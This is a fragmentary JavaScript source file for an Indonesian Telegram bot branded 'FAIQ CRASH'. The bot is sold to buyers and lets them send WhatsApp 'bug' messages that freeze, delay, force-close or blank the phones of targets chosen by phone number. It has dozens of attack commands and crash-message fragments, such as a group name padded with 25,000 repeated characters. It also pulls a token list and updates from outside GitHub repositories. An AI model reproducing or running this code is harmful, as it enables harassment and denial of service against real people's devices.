...
// ================= SECURITY =================//
/*
const GITHUB_TOKEN_LIST_URL = "https://raw.githubusercontent.com/codeaja776-lgtm/Xloads/refs/heads/main/Tokens.json";////ganti jadi Raw luh
...
│                                              │
├──────────────────────────────────────────────┤
│  FAIQ CRASH SCRIPT BERKUALITAS & LOADER TERENKRIPSI      │
└──────────────────────────────────────────────┘
`);
  process.exit(1);
}
...
let REQUIRED_CHANNEL_USERNAME = "@FaiqNewEra";
...
// ================= CONFIG =================
const IMAGES = {
  home: "https://files.catbox.moe/w0v8j9.jpg"
};
...
Developer Script: @RealsFaiqOffc
━━━━━━━━━━━━━━━━━━
...
𑁍┊FAIQ CRASH         
━━━━━━━━━━━━━━━━━━━━━━━
INFORMATION FAIQ CRASH
━━━━━━━━━━━━━━━━━━━━━━━
Developer  : @RealsFaiqOffc
System     : Free Only
Version    : 5.0 Faiq x Melza
...
┃➤ Bimz
┃➤ Bazz
┃➤ ALL BUYER FAIQ CRASH
┃➤ ALL PARTNER
┃➤ ALL HATTERS
└────────────────────

┌─〔 SPECIAL THANKS 〕
│ ✦ Semua Member FAIQ CRASH
│ ✦ All Hatters & Pembenci
└────────────────────

╰━━━〔 FAIQ CRASH NEVER DIE 〕━━━╯
...
\`\`\`js
╭──〔 𝙄𝙉𝙑𝙄𝙎 𝙉𝙊 𝙎𝙋𝘼𝙈 〕──╮
│ ↯ /FaiqxMelzaBulldo 62××  ⇢ BULDOZER 
│ ↯ /FaiqxMelzaOneHit 62××   ⇢  BUG DELAY ONE HIT
│ ↯ /FaiqxMelzaHard 62××    ☇ BUG DELAY HARD
│ ↯ /FaiqxMelzaDelayFreeze 62××     ⇢ BUG DELAY FREEZE
│ ↯ /FaiqxMelzaDelayV2 62××       ⇢ DELAY ON HIT V2
│ ↯ /FaiqxMelzaDelayBulldo 62××     ⇢ BUG DELAY X BULDO V2
│ ↯ /FaiqxMelzaDelayForceIos  62xx    ⇢ DELAY X FORCE X CRASH IOS
│ ↯ /FaiqxMelzaForclose  62xx    ⇢ FORCLOSE ANDRO NO SPAM 
╰──────────────────────╯
...
\`\`\`js
╭──〔 𝗠𝗨𝗥𝗕𝗨𝗚 𝗠𝗘𝗡𝗨 〕──╮
│ ↯ /FaiqxMelzaBebasSpamEz 62××      ⇢ SPAM BUG DELAY EASY
│ ↯ /FaiqxMelzaDelayMedium 62××   ⇢ SPAM BUG DELAY MEDIUM
│ ↯ /FaiqxMelzaDelayHard 62××    ☇ SPAM BUG DELAY HARD
│ ↯ /FaiqxMelzaUltra 62××     ⇢ SPAM BUG DELAY ULTRA
│ ↯ /FaiqxMelzaUltra 62××       ⇢ DELAY HIT SPAM
│ ↯ /FaiqxMelzaBulldoDelay 62××     ⇢ BUG DELAY X BULDO
│ ↯ /FaiqxMelzaForceIos  62xx    ⇢ FORCLOSE SPAM IOS
│ ↯ /FaiqxMelzaForceIosv2  62xx    ⇢ FORCLOSE TAG SW SPAM
╰──────────────────────╯
...
\`\`\`js
╭──〔 𝗡𝗢𝗧 𝗦𝗣𝗔𝗠 𝗕𝗨𝗚 𝗧𝗬𝗣𝗘 〕──╮
│ ↯ /FaiqxMelzaCombo 62××      ⇢ COMBO ALL FUNC
│ ↯ /FaiqxMelzaForceClick  62xx    ⇢ FORCLOSE CLICK
│ ↯ /FaiqxMelzaAndro 62×× ⇢ BLANK ANDRO V1
│ ↯ /FaiqxMelzaFreeze 62××       ⇢ FREEZE CHAT
│ ↯ /FaiqxMelzaBlank       ⇢ BLANK CLICK 
│ ↯ /FaiqxMelzaLover        ⇢ BLANK ANDROID V2
│ ↯ /FaiqxMelzaForceAndro  62xx    ⇢ FORCLOSE ANDRO
└───────────────────
...
const repoRaw = "https://github.com/azzam1235/Colmek/blob/main/Colmek.js";
...
async function checkUpdate(ctx) {
  ...
  "https://github.com/azzam1235/Colmek/blob/main/Colmek.js"
);
...
━━━━━━━━━━━━━━━━━━
FAIQ CRASH DETECTED SYSTEM ACTIVE`,
      { parse_mode: "HTML" }
    );
...
`
\`\`\`js
FAIQ CRASH - 𝙇𝙄𝙎𝙏 𝘼𝘿𝙈𝙄𝙉 𝘼𝘾𝘾𝙀𝙎𝙎 ⚠️
━━━━━━━━━━━━━━━━━━
⸙ 𝙗𝙚𝙡𝙪𝙢 𝙖𝙙𝙖 𝙖𝙙𝙢𝙞𝙣
\`\`\`
`,
...
bot.command("iqc", async (ctx) => {
  ...
  try {
    ...
    await ctx.replyWithPhoto({ source: buffer }, {
      caption: `✅ Ss Iphone By FAIQ CRASH Kece ( 🕷️ )`,
      parse_mode: "Markdown"
    });
  } catch (e) {
    console.error(e);
...
╚══════════════════════════╝
        ...
        await ctx.reply(teks, {
            ...
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: "👑 Contact Owner", url: "https://t.me/RealsFaiqOffc", style: "danger" }
                    ]
                ]
            }
        });
...
bot.command("FaiqxMelzaBulldo", checkAllPremium, checkWhatsAppConnection, checkCooldown, async (ctx) => {
  try {
    const q = ctx.message.text.split(" ")[1]; 
    if (!q) return ctx.reply("🪧 ☇ Example : /FaiqxMelzaBulldo 62xx");
    ...
    await ctx.replyWithPhoto(
      "https://files.catbox.moe/pimdcw.jpg", // ✅ FIX DISINI
      {
        caption: `
...
{ text: "༊𝐃𝐄𝐕𝐄𝐋𝐎𝐏𝐄𝐑(ᥫ᭡)", url: `https://t.me/RealsFaiqOffc`, style: "success", icon_custom_emoji_id: "5422888130984308617" } // ❌ hapus style
            ]
          ]
        }
      }
...
bot.command("FaiqxMelzaOneHit", checkAllPremium, checkWhatsAppConnection, checkCooldown, async (ctx) => {
  try {
    const q = ctx.message.text.split(" ")[1]; 
    if (!q) return ctx.reply("🪧 ☇ Example : /FaiqxMelzaOneHit 62xx");
...
bot.command("FaiqxMelzaHard", checkAllPremium, checkWhatsAppConnection, checkCooldown, async (ctx) => {
  try {
    const q = ctx.message.text.split(" ")[1]; 
    if (!q) return ctx.reply("🪧 ☇ Example : /FaiqxMelzaHard 62xx");
...
bot.command("FaiqxMelzaDelayFreeze", checkAllPremium, checkWhatsAppConnection, checkCooldown, async (ctx) => {
  try {
    const q = ctx.message.text.split(" ")[1]; 
    if (!q) return ctx.reply("🪧 ☇ Example : /FaiqxMelzaDelayFreeze 62xx");
...
bot.command("FaiqxMelzaDelayV2", checkAllPremium, checkWhatsAppConnection, checkCooldown, async (ctx) => {
  try {
    const q = ctx.message.text.split(" ")[1]; 
    if (!q) return ctx.reply("🪧 ☇ Example : /FaiqxMelzaDelayV2 62xx");
...
bot.command("FaiqxMelzaDelayBulldo", checkAllPremium, checkWhatsAppConnection, checkCooldown, async (ctx) => {
  try {
    const q = ctx.message.text.split(" ")[1]; 
    if (!q) return ctx.reply("🪧 ☇ Example : /FaiqxMelzaDelayBulldo 62xx");
...
bot.command("FaiqxMelzaDelayForceIos", checkAllPremium, checkWhatsAppConnection, checkCooldown, async (ctx) => {
  try {
    const q = ctx.message.text.split(" ")[1]; 
    if (!q) return ctx.reply("🪧 ☇ Example : /FaiqxMelzaDelayForceIos 62xx");
...
bot.command("FaiqxMelzaForceAndro", checkAllPremium, checkWhatsAppConnection, checkCooldown, async (ctx) => {
  try {
    const q = ctx.message.text.split(" ")[1]; 
    if (!q) return ctx.reply("🪧 ☇ Example : /FaiqxMelzaForceAndro 62xx");
...
bot.command("FaiqxMelzaBebasSpamEz", checkAllPremium, checkWhatsAppConnection, checkCooldown, async (ctx) => {
  try {
    const q = ctx.message.text.split(" ")[1]; 
    if (!q) return ctx.reply("🪧 ☇ Example : /FaiqxMelzaBebasSpamEz 62xx");
...
bot.command("FaiqxMelzaForclose", checkAllPremium, checkWhatsAppConnection, checkCooldown, async (ctx) => {
  try {
    const q = ctx.message.text.split(" ")[1]; 
    if (!q) return ctx.reply("🪧 ☇ Example : /FaiqxMelzaForclose 62xx");
...
bot.command("FaiqxMelzaForceIosv2", checkAllPremium, checkWhatsAppConnection, checkCooldown, async (ctx) => {
  try {
    const q = ctx.message.text.split(" ")[1]; 
    if (!q) return ctx.reply("🪧 ☇ Example : /FaiqxMelzaForceIosv2 62xx");
...
bot.command("FaiqxMelzaUltra", checkAllPremium, checkWhatsAppConnection, checkCooldown, async (ctx) => {
  try {
    const q = ctx.message.text.split(" ")[1]; 
    if (!q) return ctx.reply("🪧 ☇ Example : /FaiqxMelzaUltra 62xx");
...
╘═——————————————═⬡</pre></blockquote>`,
        ...
        reply_markup: {
          inline_keyboard: [
            [
              { text: "༊ 𝐂𝐇𝐄𝐊𝐂𝐊 𝐓𝐀𝐑𝐆𝐄𝐓 ༗", url: `https://wa.me/${q}`, style: "success", icon_custom_emoji_id: "6034957065569441680" },    
{ text: "༊𝐃𝐄𝐕𝐄𝐋𝐎𝐏𝐄𝐑(ᥫ᭡)", url: `https://t.me/RealsFaiqOffc`, style: "danger", icon_custom_emoji_id: "5422888130984308617" } // ❌ hapus style
            ]
          ]
        }
      }
...
bot.command("FaiqxMelzaDelayHard", checkAllPremium, checkWhatsAppConnection, checkCooldown, async (ctx) => {
  try {
    const q = ctx.message.text.split(" ")[1]; 
    if (!q) return ctx.reply("🪧 ☇ Example : /FaiqxMelzaDelayHard 62xx");
...
╘═——————————————═⬡</pre></blockquote>`,
        ...
        reply_markup: {
          inline_keyboard: [
            [
              { text: "༊ 𝐂𝐇𝐄𝐊𝐂𝐊 𝐓𝐀𝐑𝐆𝐄𝐓 ༗", url: `https://wa.me/${q}`, style: "success", icon_custom_emoji_id: "6034957065569441680" },
            { text: "༊𝐃𝐄𝐕𝐄𝐋𝐎𝐏𝐄𝐑(ᥫ᭡)", url: `https://t.me/RealsFaiqOffc`, style: "primary", icon_custom_emoji_id: "5422888130984308617" } // ❌ hapus style
            ]
          ]
        }
      }
...
bot.command("FaiqxMelzaDelayMedium", checkAllPremium, checkWhatsAppConnection, checkCooldown, async (ctx) => {
  try {
    const q = ctx.message.text.split(" ")[1]; 
    if (!q) return ctx.reply("🪧 ☇ Example : /FaiqxMelzaDelayMedium 62xx");
...
/// ============= CASE BUG 10 BEBAS SPAM=============\\\
bot.command("FaiqxMelzaForceIos", checkAllPremium, checkWhatsAppConnection, checkCooldown, async (ctx) => {
  try {
    const q = ctx.message.text.split(" ")[1]; 
    if (!q) return ctx.reply("🪧 ☇ Example : /FaiqxMelzaForceIos 62xx");
...
/// ============= CASE BUG 5 BEBAS SPAM=============\\\
bot.command("FaiqxMelzaBulldoDelay", checkAllPremium, checkWhatsAppConnection, checkCooldown, async (ctx) => {
  try {
    const q = ctx.message.text.split(" ")[1]; 
    if (!q) return ctx.reply("🪧 ☇ Example : /FaiqxMelzaBulldoDelay 62xx");
...
/// CASE BUG \\\
bot.command("FaiqxMelzaCombo", checkAllPremium, checkWhatsAppConnection, checkCooldown, async (ctx) => {
  const thumbnailUrl2 = "https://files.catbox.moe/pimdcw.jpg";

  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply("🪧 ☇ Format: /FaiqxMelzaCombo 62×××");
  ...
  const processMessage = await ctx.telegram.sendPhoto(
    ...
    {
      caption: `
<pre><code class="language-javascript">⟡━⟢ FAIQ CRASH ⟣━⟡
⌑ Target: ${q}
⌑ Type: combo bug
⌑ Status: Process
╘═——————————————═⬡</code></pre>`,
...
/// ============= CASE BUG 10 BEBAS SPAM=============\\\
bot.command("FaiqxMelzaFreeze", checkAllPremium, checkWhatsAppConnection, checkCooldown, async (ctx) => {
  try {
    const q = ctx.message.text.split(" ")[1]; 
    if (!q) return ctx.reply("🪧 ☇ Example : /FaiqxMelzaFreeze 62xx");
    ...
    // 🚀 PROCESSING
    await ctx.replyWithPhoto(
      { url: "https://files.catbox.moe/pimdcw.jpg" },
      {
...
bot.command("FaiqxMelzaForceClick", checkAllPremium, checkWhatsAppConnection, checkCooldown, async (ctx) => {
  try {
    const q = ctx.message.text.split(" ")[1]; 
    if (!q) return ctx.reply("🪧 ☇ Example : /FaiqxMelzaForceClick 62xx");
...
◇ 🦋 Command Bugs : FaiqxMelzaForceClick
━━━━━━━━━━━━━━━
🚀 Initializing System... ✅ Success
⚡ Sending Payload... ✅ Success
📡 Injecting Data... ✅ Success
...
/// ============= CASE BUG 10 BEBAS SPAM=============\\\
bot.command("FaiqxMelzaAndro", checkAllPremium, checkWhatsAppConnection, checkCooldown, async (ctx) => {
  // Definisikan thumbnailUrl2 dengan URL gambar dari Catbox
  const thumbnailUrl2 = "https://files.catbox.moe/pimdcw.jpg"; // Ganti dengan URL asli milikmu

  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /FaiqxMelzaAndro 62×××`);
...
bot.command("FaiqxMelzaLover", checkAllPremium, checkWhatsAppConnection, checkCooldown, async (ctx) => {
  try {
    const q = ctx.message.text.split(" ")[1]; 
    if (!q) return ctx.reply("🪧 ☇ Example : /FaiqxMelzaLover 62xx");
...
/// ============= CASE BUG 10 BEBAS SPAM=============\\\
bot.command("FaiqxMelzaBlank", checkAllPremium, checkWhatsAppConnection, checkCooldown, async (ctx) => {
  try {
    const q = ctx.message.text.split(" ")[1]; 
    if (!q) return ctx.reply("🪧 ☇ Example : /FaiqxMelzaBlank 62xx");
...
bot.command("testfunction", async (msg, match) => {
  ...
  try {
    ...
    const processMsg = await bot.sendPhoto(chatId, thumbnailUrlV2, {
      caption: `
<blockquote><pre>⬡═―—⊱ ⎧ FAIQ CRASH ATTACK ⎭ ⊰―—═⬡
▢  Target: ${q}
▢  Type: Unknown Func
▢  Status: Process Bug
╘═——————————————═⬡</pre></blockquote>`,
    ...
    const finalText = `
<blockquote><pre>⬡═―—⊱ ⎧ FAIQ CRASH ATTACK ⎭ ⊰―—═⬡</pre></blockquote>
▢  Target: ${q}
▢  Type: Unknown Func
▢  Status: Success Bug
╘═——————————————═⬡`;
...
console.log(`FAIQ CRASH sending blank x fc click message to ${target}`);
...
     inviteExpiration: "99999999999",
     groupName: "༑ ▾ FAIQ CRASH Is Here ▾ ༑" + "ꦾ".repeat(25000),
...
  console.log("[!] FAIQ CRASH Bug Sent to: " + target);
}
